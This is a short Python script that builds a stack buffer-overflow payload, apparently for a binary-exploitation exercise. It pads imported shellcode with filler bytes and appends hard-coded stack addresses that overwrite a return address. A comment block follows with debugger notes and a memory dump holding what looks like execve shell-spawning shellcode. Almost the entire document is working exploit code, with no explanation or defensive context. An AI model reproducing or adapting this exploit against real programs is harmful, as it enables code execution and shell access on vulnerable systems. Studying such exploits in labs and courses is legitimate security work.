from shellcode import shellcode
import sys


shellcode = shellcode + b'A'*(2048-len(shellcode))
shellcode = shellcode+ 0xfff6e5f8.to_bytes(4,'little')+0xfff6ee0C.to_bytes(4,'little')
sys.stdout.buffer.write(shellcode)
"""

vulnerable return address: 0x08048c80

start address: 0xfff6e5f8

0x08048c22
0x8048c22

break point

0x08048c22

find here 0xfff6ee00
return address in stack:0xfff6ee0C

0xfff6e5f0:     0x00000000      0x00000000      0x438ddb31      0x80cd9917
0xfff6e600:     0x895e1feb      0xc0310876      0x89074688      0x0bb00c46
0xfff6e610:     0x4e8df389      0x0c568d08      0xdb3180cd      0xcd40d889
"""